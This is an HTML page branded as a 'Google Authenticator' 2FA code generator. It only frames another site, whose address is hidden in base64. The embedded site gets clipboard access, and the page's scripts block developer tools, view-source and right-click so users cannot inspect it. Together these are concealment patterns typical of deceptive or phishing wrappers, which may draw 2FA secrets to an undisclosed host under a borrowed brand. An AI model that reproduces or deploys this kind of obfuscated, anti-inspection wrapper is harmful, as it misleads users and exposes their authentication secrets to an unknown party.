<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="Generate Two-Factor Authentication (2FA) codes using Google Authenticator.">
  <meta name="keywords" content="2FA, Two-Factor Authentication, Google Authenticator, OTP, Security">
  <meta name="robots" content="index, follow">

  <meta property="og:title" content="Two-Factor Authentication - Google Authenticator">
  <meta property="og:description" content="Generate secure 2FA codes for your accounts.">
  <meta property="og:type" content="website">
  <meta property="og:url" content="https://fast2fa.vercel.app">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="Two-Factor Authentication - Google Authenticator">
  <meta name="twitter:description" content="Easily generate secure 2FA codes.">

  <title>Two-Factor Authentication - Google Authenticator</title>

  <style>
    /* Memungkinkan scroll */
    body, html {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background-color: #000;
      height: 100%;
      overflow-y: auto; /* Perbaikan: Bisa di-scroll */
    }

    /* Pastikan iframe penuh, tetapi tetap bisa discroll di luar iframe */
    #iframe-container {
      width: 100%;
      height: 100vh;
      overflow-y: auto; /* Bisa scroll di luar iframe */
    }

    iframe {
      width: 100%;
      height: 100vh;
      border: none;
    }
  </style>
</head>

<body>

  <!-- Container agar halaman tetap bisa scroll -->
  <div id="iframe-container">
    <iframe id="iframe" allow="clipboard-read; clipboard-write" allowfullscreen></iframe>
  </div>

  <script>
    // Mengatur URL iframe dari base64 untuk keamanan
    window.onload = function () {
      var iframeUrl = atob('aHR0cHM6Ly9mYXN0MmZhamhqc2ZoajM4eWZhYmhmYWhnaHZhZnl1M3NhMjJmZmZhYXZhdS52ZXJjZWwuYXBwLw==');
      document.getElementById('iframe').src = iframeUrl;
    };

    // Fungsi untuk refresh iframe
    function reloadIframe() {
      let iframe = document.getElementById('iframe');
      iframe.src = iframe.src; // Refresh iframe
    }

    // ðŸ”„ Auto-refresh saat scroll ke bawah
    let lastScrollTop = 0;
    document.getElementById('iframe-container').addEventListener("scroll", function () {
      let currentScroll = this.scrollTop;

      if (currentScroll > lastScrollTop) {
        reloadIframe(); // Refresh iframe jika scroll ke bawah
      }

      lastScrollTop = currentScroll;
    });

    // Mencegah inspeksi elemen & klik kanan
    document.addEventListener('keydown', function (event) {
      if (event.key === 'F12' || (event.ctrlKey && event.shiftKey && event.key === 'I') || (event.ctrlKey && event.key === 'U')) {
        event.preventDefault();
      }
    });

    document.addEventListener('contextmenu', function (event) {
      event.preventDefault();
    });

    document.addEventListener('mousedown', function (event) {
      if (event.button === 2) {
        event.preventDefault();
      }
    });

  </script>

</body>

</html>
